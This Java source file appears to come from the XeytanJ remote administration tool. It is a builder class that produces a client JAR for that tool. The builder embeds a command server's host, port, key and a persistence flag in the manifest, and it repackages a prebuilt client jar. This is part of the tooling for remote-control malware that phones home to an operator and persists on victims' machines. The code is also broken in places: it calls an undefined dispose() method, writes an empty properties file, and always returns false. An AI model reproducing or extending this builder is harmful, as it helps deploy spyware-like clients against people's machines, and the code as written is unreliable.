package com.melardev.xeytanj.services.builder;

import com.melardev.xeytanj.models.BuildClientInfoStructure;

import java.io.*;
import java.net.URL;
import java.util.Properties;
import java.util.jar.*;

public class JarClientBuilder implements IClientBuilder {
    @Override
    public boolean build(BuildClientInfoStructure buildClientInfoStructure) {

        File outFile = buildClientInfoStructure.getOutputFile();

        if (!outFile.getName().endsWith(".jar"))
            outFile = new File(outFile.getAbsolutePath() + ".jar");

        if (outFile.exists())
            outFile.delete();


        Manifest manifest = new Manifest();
        Attributes attrs = manifest.getMainAttributes();
        attrs.putValue("Manifest-Version", "1.0");
        attrs.putValue("Created-By", "1.7.0_06 (Oracle Corporation)");
        attrs.putValue("Main-Class", "main.XeytanClient");
        attrs.putValue("Class-Path", ".");

        attrs.putValue("Personalized", "Boomerang");
        attrs.putValue("Server-Host", buildClientInfoStructure.getServerHost());
        attrs.putValue("Server-Port", buildClientInfoStructure.getServerPort());
        attrs.putValue("Server-Key", buildClientInfoStructure.getKey());
        attrs.putValue("Enable-Persistence", String.valueOf(buildClientInfoStructure.isPersistenceEnabled()));
        /*
        String geo;
        if (rdbtnGetGeoLocally.isSelected())
            geo = "remote";
        else
            geo = "local";
        attrs.putValue("GeoLocation", geo);
        */

        /*
         * JarInputStream jis = new JarInputStream(
         * getClass().getResourceAsStream(
         * "executables/client/xeytanClient.jar"));
         */
        URL ff = CommandLineClientBuilder.class.getResource("JarClientBuilder.class");
        if (ff.getProtocol().contains("file")) {

            File file = new File("./xeytanj-client.jar");
            try {
                File propsFile = new File("./client_properties.MF");
                BufferedWriter fos = new BufferedWriter(new PrintWriter(new FileOutputStream(propsFile)));
                Properties props = new Properties();
                props.forEach((key, value) -> {
                    try {
                        fos.write(key + ": " + value + "\n");
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });

                fos.write("\n");
                fos.write("\n");
                fos.close();

                JarInputStream jis = new JarInputStream(new FileInputStream(file));
                JarOutputStream jos = new JarOutputStream(new FileOutputStream(outFile), manifest);

                jis.getManifest().getMainAttributes();

                JarEntry entry;

                while ((entry = jis.getNextJarEntry()) != null) {

                    jos.putNextEntry(entry);
                    byte[] buffer = new byte[4096];
                    int i;

                    while ((i = jis.read(buffer)) > -1)
                        jos.write(buffer, 0, i);
                    jos.closeEntry();
                }

                jos.flush();
                jos.close();
                jis.close();


                dispose();

            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        } else {

        }
        return false;
    }

    public static void main(String[] args) {

        JarClientBuilder builder = new JarClientBuilder();
        builder.build(new BuildClientInfoStructure("localhost", "9000", 3000, "xeytaj", true,
                new File("./outputJar.jar")));


    }
}
